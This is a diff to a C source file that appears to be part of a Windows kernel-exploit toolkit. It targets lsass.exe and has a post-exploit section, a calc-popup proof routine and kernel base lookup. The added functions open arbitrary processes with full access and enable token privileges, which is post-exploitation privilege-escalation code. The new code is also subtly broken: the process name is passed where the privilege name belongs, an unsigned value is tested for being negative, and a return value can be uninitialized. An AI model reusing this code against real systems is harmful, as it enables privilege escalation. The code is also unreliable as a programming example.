@@ -5,6 +5,7 @@
  */
 
 #include <windows.h>
+#include <Winternl.h>
 #include <winioctl.h>
 #include <stdio.h>
 #include <stdint.h>
@@ -12,7 +13,9 @@
 #include <tchar.h>
 #include <malloc.h>
 
-#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "User32.lib")
+#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib,"ntdll.lib")
 
 #define SYSTEM_PROCESS_NAME "lsass.exe"
 
@@ -134,6 +137,11 @@ VOID hexdump(PVOID data, SIZE_T size)
  * Post exploit
  */
 
+
+/**
+ * Returns the *first* PID of the processes found name `processName`
+ * Returns -1 if failure
+ */
 DWORD GetProcessIdByName(LPTSTR processName)
 {
         HANDLE hProcessSnap, hProcess;
@@ -176,6 +184,34 @@ DWORD GetProcessIdByName(LPTSTR processName)
 
         CloseHandle( hProcessSnap );
         return dwPid;
+}
+
+
+DWORD GetProcessParentId(DWORD dwProcessId)
+{
+        HANDLE hProcessSnap;
+        PROCESSENTRY32 pe = {0, };
+
+        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if( hProcessSnap == INVALID_HANDLE_VALUE ){
+                perr("CreateToolhelp32Snapshot failed");
+                return -1;
+        }
+
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        DWORD dwPpid = -1;
+
+        if(Process32First(hProcessSnap, &pe)) {
+                do {
+                        if (pe.th32ProcessID == dwProcessId) {
+                                dwPpid = pe.th32ParentProcessID;
+                                break;
+                        }
+                } while(Process32Next(hProcessSnap, &pe));
+        }
+
+        CloseHandle(hProcessSnap);
+        return dwPpid;
 }
 
 
@@ -237,6 +273,49 @@ void PopupCalc()
         PopupNewProcess("c:\\windows\\system32\\calc.exe");
         return;
 }
+
+
+BOOL AssignPrivilegeToProcessId(DWORD dwPid, LPCTSTR lpPrivilegeName)
+{
+        HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwPid);
+        HANDLE hParentToken;
+
+        if (!hParentProcess || OpenProcessToken(hParentProcess, TOKEN_ALL_ACCESS, &hParentToken)==FALSE)
+                return FALSE;
+
+        LUID luidPrivilegeValue;
+        BOOL bRes;
+
+        if(LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeValue)) {
+                TOKEN_PRIVILEGES pNewPrivs;
+                pNewPrivs.PrivilegeCount = 1;
+                pNewPrivs.Privileges[0].Luid = luidPrivilegeValue;
+                pNewPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+                bRes = AdjustTokenPrivileges(hParentToken,
+                                             FALSE,
+                                             &pNewPrivs,
+                                             sizeof(TOKEN_PRIVILEGES),
+                                             (PTOKEN_PRIVILEGES) NULL,
+                                             (PDWORD) NULL);
+        }
+
+        CloseHandle(hParentToken);
+        CloseHandle(hParentProcess);
+        return bRes;
+}
+
+
+BOOL AssignPrivilegeToProcessName(LPTSTR lpProcessName, LPCTSTR lpPrivilegeName)
+{
+        DWORD dwParentPid = GetProcessIdByName(lpProcessName);
+        if (dwParentPid < 0)
+                return FALSE;
+
+        return AssignPrivilegeToProcessId(dwParentPid, lpProcessName);
+}
+
+
 
 
 /**
@@ -419,6 +498,7 @@ DWORD GetPageSize()
  * - https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/class.htm
  */
 #define SystemModuleInformation  (SYSTEM_INFORMATION_CLASS)0xb
+
 ULONG_PTR GetKernelImageBase()
 {
         struct _RTL_PROCESS_MODULE_INFORMATION
